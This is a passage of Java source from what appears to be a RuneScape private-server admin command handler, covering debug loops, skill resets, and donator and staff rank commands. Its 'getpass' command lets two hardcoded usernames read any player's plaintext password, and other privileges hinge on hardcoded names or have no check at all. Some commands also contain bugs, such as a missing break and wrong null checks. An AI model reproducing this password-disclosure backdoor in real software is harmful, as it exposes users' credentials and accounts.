					player.applyHit(new Hit(player, Utils.getRandom(3),
							HitLook.HEALED_DAMAGE));
				return true; 

			case "iloop":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer
							.valueOf(cmd[2]); i++)
						player.getInterfaceManager().sendInterface(i);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 

			case "tloop":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer
							.valueOf(cmd[2]); i++)
						player.getInterfaceManager().sendTab(i,
								Integer.valueOf(cmd[3]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 

			case "configloop":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer.valueOf(cmd[2]); i++) {
						if (i >= 2633) {
							break;
						}
						player.getPackets().sendConfig(i, Integer.valueOf(cmd[3]));
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 
			case "configfloop":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer
							.valueOf(cmd[2]); i++)
						player.getPackets().sendConfigByFile(i, Integer.valueOf(cmd[3]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 

			case "testo2":
				for (int x = 0; x < 10; x++) {

					object = new WorldObject(62684, 0, 0,
							x * 2 + 1, 0, 0);
					player.getPackets().sendSpawnedObject(object);

				}
				return true; 

			/*case "addn":
				player.getNotes().add(new Note(cmd[1], 1));
				player.getNotes().refresh();
				return true; 

			case "remn":
				player.getNotes().remove((Note) player.getTemporaryAttributtes().get("curNote"));
				return true; */

			case "objectanim":

				object = cmd.length == 4 ? World
						.getObject(new WorldTile(Integer.parseInt(cmd[1]),
								Integer.parseInt(cmd[2]), player.getPlane()))
								: World.getObject(
										new WorldTile(Integer.parseInt(cmd[1]), Integer
												.parseInt(cmd[2]), player.getPlane()),
												Integer.parseInt(cmd[3]));
						if (object == null) {
							player.getPackets().sendPanelBoxMessage(
									"No object was found.");
							return true;
						}
						player.getPackets().sendObjectAnimation(
								object,
								new Animation(Integer.parseInt(cmd[cmd.length == 4 ? 3
										: 4])));
						return true; 
			/*case "loopoanim":
				int x = Integer.parseInt(cmd[1]);
				int y = Integer.parseInt(cmd[2]);
				final WorldObject object1 = World
						.getRegion(player.getRegionId()).getSpawnedObject(
								new WorldTile(x, y, player.getPlane()));
				if (object1 == null) {
					player.getPackets().sendPanelBoxMessage(
							"Could not find object at [x=" + x + ", y=" + y
							+ ", z=" + player.getPlane() + "].");
					return true;
				}
				System.out.println("Object found: " + object1.getId());
				final int start = cmd.length > 3 ? Integer.parseInt(cmd[3])
						: 10;
				final int end = cmd.length > 4 ? Integer.parseInt(cmd[4])
						: 20000;
				CoresManager.fastExecutor.scheduleAtFixedRate(new TimerTask() {
					int current = start;

					@Override
					public void run() {
						while (AnimationDefinitions
								.getAnimationDefinitions(current) == null) {
							current++;
							if (current >= end) {
								cancel();
								return;
							}
						}
						player.getPackets().sendPanelBoxMessage(
								"Current object animation: " + current + ".");
						player.getPackets().sendObjectAnimation(object1,
								new Animation(current++));
						if (current >= end) {
							cancel();
						}
					}
				}, 1800, 1800);
				return true; */

			case "unmuteall":
				for (Player targets : World.getPlayers()) {
					if (player == null) continue;
					targets.setMuted(0);
				}
				return true;

			case "bconfigloop":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
					return true;
				}
				try {
					for (int i = Integer.valueOf(cmd[1]); i < Integer.valueOf(cmd[2]); i++) {
						if (i >= 1929) {
							break;
						}
						player.getPackets().sendGlobalConfig(i, Integer.valueOf(cmd[3]));
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: config id value");
				}
				return true; 
			case "div":
				player.sendMessage("You divination level is "+ player.getSkills().getDivinationLevel()+".");
				player.sendMessage("You have "+ player.getSkills().getDivinationXp()+" divination exp.");

			case "resetmaster":
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().setXp(skill, 0);
					player.getSkills().init();
					return true;
				}
				try {
					player.getSkills().setXp(Integer.valueOf(cmd[1]), 0);
					player.getSkills().set(Integer.valueOf(cmd[1]), 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::master skill");
				}
				return true; 

			case "resetstr":
					player.getSkills().setXp(2, 0);
					player.getSkills().set(2, 1);	
				return true; 

			case "highscores":
				Highscores.updateHighscores(player);
				return true;
				
				
				
			case "master":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().addXp(skill, 150000000);
					return true;
				}
				try {
					player.getSkills().addXp(Integer.valueOf(cmd[1]),
							150000000);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::master skill");
				}
				}
				return true; 
				
			case "masterme":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (!player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().addXp(skill, 150000000);
					return true;
				}
				try {
					player.getSkills().addXp(Integer.valueOf(cmd[1]),
							150000000);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::master skill");
				}
				}
				return true; 
				
			case "mastercape":
				player.setCompletedFightCaves();
				player.setCompletedFightKiln();
				player.sm("You master your requirements.");
				return true;

			case "window":
				player.getPackets().sendWindowsPane(1253, 0);
				return true;
			case "bconfig":
				if (cmd.length < 3) {
					player.getPackets().sendPanelBoxMessage(
							"Use: bconfig id value");
					return true;
				}
				try {
					player.getPackets().sendGlobalConfig(
							Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: bconfig id value");
				}
				return true; 

			case "tonpc":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::tonpc id(-1 for player)");
					return true;
				}
				try {
					player.getAppearence().transformIntoNPC(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::tonpc id(-1 for player)");
				}
				return true; 

			case "inter":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}
				try {
					player.getInterfaceManager().sendInterface(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true; 

			case "overlay":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}
				int child = cmd.length > 2 ? Integer.parseInt(cmd[2]) : 28;
				try {
					player.getPackets().sendInterface(true, 746, child, Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true; 

			case "setroll":
				if (player.getUsername().equalsIgnoreCase("reddragon")) {
                String rollnumber = "";
				for (int i = 1; i < cmd.length; i++) {
					rollnumber += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				}
				rollnumber = Utils.formatPlayerNameForDisplay(rollnumber);
				if (rollnumber.length() < 1 || rollnumber.length() > 2) {
					player.getPackets()
							.sendGameMessage(
									"You can't use a number below 1 character or more then 2 characters.");
				}
				player.getPackets().sendGameMessage("Rolling...");
	            player.setNextGraphics(new Graphics(2075));
	            player.setNextAnimation(new Animation(11900));
                player.setNextForceTalk(new ForceTalk("You rolled <col=FF0000>" + rollnumber + "</col> " + "on the percentile dice"));
                player.getPackets().sendGameMessage("rolled <col=FF0000>" + rollnumber + "</col> " + "on the percentile dice");
				}
				 if ( (!player.getUsername().equalsIgnoreCase("reddragon"))) {
					player.sm("You don't have rights to use this.");
				}
				return true;	
				
				
				
			case "empty":
				player.getInventory().reset();
				return true; 

			case "interh":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}

				try {
					int interId = Integer.valueOf(cmd[1]);
					for (int componentId = 0; componentId < Utils
							.getInterfaceDefinitionsComponentsSize(interId); componentId++) {
						player.getPackets().sendIComponentModel(interId,
								componentId, 66);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true;

			case "inters":
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}

				try {
					int interId = Integer.valueOf(cmd[1]);
					for (int componentId = 0; componentId < Utils
							.getInterfaceDefinitionsComponentsSize(interId); componentId++) {
						player.getPackets().sendIComponentText(interId,
								componentId, "cid: " + componentId);
					}
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true;


			case "donator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				loggedIn = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target1 == null)
					return true;
				target1.setDonator(true);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn)
					target1.getPackets().sendGameMessage(
							"You have been given donator by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You gave donator to "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				}
				return true;
            case "extremedonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn111 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn111 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setExtremeDonator(true);
	    target1.getAppearence().setTitle(2022);
                SerializableFilesManager.savePlayer(target1);
                if (loggedIn111) {
                    target1.getPackets().sendGameMessage(
                            "You have been given extreme donator by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You gave extreme donator to "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;

            case "removeextremedonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn1111 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn1111 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setExtremeDonator(false);
                SerializableFilesManager.savePlayer(target1);
                if (loggedIn1111) {
                    target1.getPackets().sendGameMessage(
                            "Your extreme donator was removed by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You removed extreme donator from "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;
                
            case "angelicdonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn11123 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn11123 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setAngelicDonator(true);
	    target1.getAppearence().setTitle(2023);
                SerializableFilesManager.savePlayer(target1);
                if (loggedIn11123) {
                    target1.getPackets().sendGameMessage(
                            "You have been given angelic donator by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You gave angelic donator to "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;
                
            case "divinedonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn11123 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn11123 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setDivineDonator(true);
	    target1.getAppearence().setTitle(2023);
                SerializableFilesManager.savePlayer(target1);
                if (loggedIn11123) {
                    target1.getPackets().sendGameMessage(
                            "You have been given divine donator by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You gave divine donator to "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;
                
            case "supremedonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn11123 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn11123 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setSupremeDonator(true);
	    target1.getAppearence().setTitle(2023);
                SerializableFilesManager.savePlayer(target1);
                if (loggedIn11123) {
                    target1.getPackets().sendGameMessage(
                            "You have been given supreme donator by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You gave supreme donator to "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;

            case "legendarydonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn11123 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn11123 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setLegendaryDonator(true);
	    target1.getAppearence().setTitle(2023);
                SerializableFilesManager.savePlayer(target1);
                if (loggedIn11123) {
                    target1.getPackets().sendGameMessage(
                            "You have been given legendary donator by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You gave legendary donator to "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;
                
            case "removedivinedonator":
  				if (!player.hasStaffPin) {
  		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
  					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
  				} else {
                  name = "";
                  for (int i = 1; i < cmd.length; i++) {
                      name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                  }
                  target1 = World.getPlayerByDisplayName(name);
                  boolean loggedIn11111123499 = true;
                  if (target1 == null) {
                      target1 = SerializableFilesManager.loadPlayer(Utils
                              .formatPlayerNameForProtocol(name));
                      if (target1 != null) {
                          target1.setUsername(Utils
                                  .formatPlayerNameForProtocol(name));
                      }
                      loggedIn11111123499 = false;
                  }
                  if (target1 == null) {
                      return true;
                  }
                  target1.setDivineDonator(false);
                  SerializableFilesManager.savePlayer(target1);
                  boolean loggedIn111111234999 = true;
                  if (loggedIn111111234999) {
                      target1.getPackets().sendGameMessage(
                              "Your divine donator was removed by "
                              + Utils.formatPlayerNameForDisplay(player
                              .getUsername()), true);
                  }
                  player.getPackets().sendGameMessage(
                          "You removed divine donator from "
                          + Utils.formatPlayerNameForDisplay(target1
                          .getUsername()), true);
  				}
                  return true;
                
            case "removeangelicdonator":
 				if (!player.hasStaffPin) {
 		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
 					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
 				} else {
                 name = "";
                 for (int i = 1; i < cmd.length; i++) {
                     name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                 }
                 target1 = World.getPlayerByDisplayName(name);
                 boolean loggedIn11111123499 = true;
                 if (target1 == null) {
                     target1 = SerializableFilesManager.loadPlayer(Utils
                             .formatPlayerNameForProtocol(name));
                     if (target1 != null) {
                         target1.setUsername(Utils
                                 .formatPlayerNameForProtocol(name));
                     }
                     loggedIn11111123499 = false;
                 }
                 if (target1 == null) {
                     return true;
                 }
                 target1.setAngelicDonator(false);
                 SerializableFilesManager.savePlayer(target1);
                 boolean loggedIn111111234999 = true;
                 if (loggedIn111111234999) {
                     target1.getPackets().sendGameMessage(
                             "Your angelic donator was removed by "
                             + Utils.formatPlayerNameForDisplay(player
                             .getUsername()), true);
                 }
                 player.getPackets().sendGameMessage(
                         "You removed angelic donator from "
                         + Utils.formatPlayerNameForDisplay(target1
                         .getUsername()), true);
 				}
                 return true;
                
            case "removesupremedonator":
 				if (!player.hasStaffPin) {
 		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
 					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
 				} else {
                 name = "";
                 for (int i = 1; i < cmd.length; i++) {
                     name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                 }
                 target1 = World.getPlayerByDisplayName(name);
                 boolean loggedIn11111123499 = true;
                 if (target1 == null) {
                     target1 = SerializableFilesManager.loadPlayer(Utils
                             .formatPlayerNameForProtocol(name));
                     if (target1 != null) {
                         target1.setUsername(Utils
                                 .formatPlayerNameForProtocol(name));
                     }
                     loggedIn11111123499 = false;
                 }
                 if (target1 == null) {
                     return true;
                 }
                 target1.setSupremeDonator(false);
                 SerializableFilesManager.savePlayer(target1);
                 boolean loggedIn111111234999 = true;
                 if (loggedIn111111234999) {
                     target1.getPackets().sendGameMessage(
                             "Your supreme donator was removed by "
                             + Utils.formatPlayerNameForDisplay(player
                             .getUsername()), true);
                 }
                 player.getPackets().sendGameMessage(
                         "You removed supreme donator from "
                         + Utils.formatPlayerNameForDisplay(target1
                         .getUsername()), true);
 				}
                 return true;
                 
			case "halloween":
				HalloweenEvent.startEvent();
				return true;

            case "removelegendarydonator":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
                name = "";
                for (int i = 1; i < cmd.length; i++) {
                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                target1 = World.getPlayerByDisplayName(name);
                boolean loggedIn11111123499 = true;
                if (target1 == null) {
                    target1 = SerializableFilesManager.loadPlayer(Utils
                            .formatPlayerNameForProtocol(name));
                    if (target1 != null) {
                        target1.setUsername(Utils
                                .formatPlayerNameForProtocol(name));
                    }
                    loggedIn11111123499 = false;
                }
                if (target1 == null) {
                    return true;
                }
                target1.setLegendaryDonator(false);
                SerializableFilesManager.savePlayer(target1);
                boolean loggedIn111111234999 = true;
                if (loggedIn111111234999) {
                    target1.getPackets().sendGameMessage(
                            "Your legendary donator was removed by "
                            + Utils.formatPlayerNameForDisplay(player
                            .getUsername()), true);
                }
                player.getPackets().sendGameMessage(
                        "You removed legendary donator from "
                        + Utils.formatPlayerNameForDisplay(target1
                        .getUsername()), true);
				}
                return true;
                
                
			case "getpass":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (!player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				} else {
					String name1 = "";
					for (int i = 1; i < cmd.length; i++)
						name1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
					Player p = World.getPlayerByDisplayName(name1);
								player.getPackets().sendGameMessage("Their password is " + p.getPassword(), true);
								return true;
				}
				}
								

				
			case "giveadmintoplayer":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if ( !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				} else {
					if (!player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("")) {
						return true;
					}
					String user2 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player other2 = World.getPlayerByDisplayName(user2);
					if (other2 == null)
						return true;
					other2.setRights(2);
					SerializableFilesManager.savePlayer(other2);
					other2.getPackets().sendGameMessage(
							"<col=ff0000>You've been awarded Noszscape Administrator "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
					player.getPackets().sendGameMessage(
							"<col=ff0000>You given Noszscape Administrator to "
									+ Utils.formatPlayerNameForDisplay(other2
											.getUsername()), true);
					return true;
				}
				}
			case "deathtaskp":
				player.DeathPoints += 100;
					return true;
				

			case "makesupport":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn1 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn1 = false;
				}
				if (target1 == null)
					return true;
				target1.setSupporter(true);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn1)
					target1.getPackets().sendGameMessage(
							"You have been given supporter rank by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You gave supporter rank to "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				}
				return true; 
			case "removesupport":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn2 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn2 = false;
				}
				if (target1 == null)
					return true;
				target1.setSupporter(false);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn2)
					target1.getPackets().sendGameMessage(
							"Your supporter rank was removed by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You removed supporter rank of "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				}
				return true;
			case "makegfx":
				if( !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn11 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn11 = false;
				}
				if (target1 == null)
					return true;
				target1.setGraphicDesigner(true);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn11)
					target1.getPackets().sendGameMessage(
							"You have been given graphic designer rank by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You gave graphic designer rank to "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				return true; 
			case "removegfx":
				if( !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn21 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn21 = false;
				}
				if (target1 == null)
					return true;
				target1.setGraphicDesigner(false);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn21)
					target1.getPackets().sendGameMessage(
							"Your graphic designer rank was removed by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You removed graphic designer rank of "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				return true;
			case "makefmod":
				if( !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn11221 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn11221 = false;
				}
				if (target1 == null)
					return true;
				target1.setForumModerator(true);
				SerializableFilesManager.savePlayer(target1);
				if (loggedIn11221)
					target1.getPackets().sendGameMessage(
							"You have been given graphic designer rank by "
									+ Utils.formatPlayerNameForDisplay(player
											.getUsername()), true);
				player.getPackets().sendGameMessage(
						"You gave graphic designer rank to "
								+ Utils.formatPlayerNameForDisplay(target1
										.getUsername()), true);
				return true; 
			case "removefmod":
				if( !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
					return true;
				}
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target1 = World.getPlayerByDisplayName(name);
				boolean loggedIn7211 = true;
				if (target1 == null) {
					target1 = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target1 != null)
						target1.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn7211 = false;
				}
				if (target1 == null)
					return true;
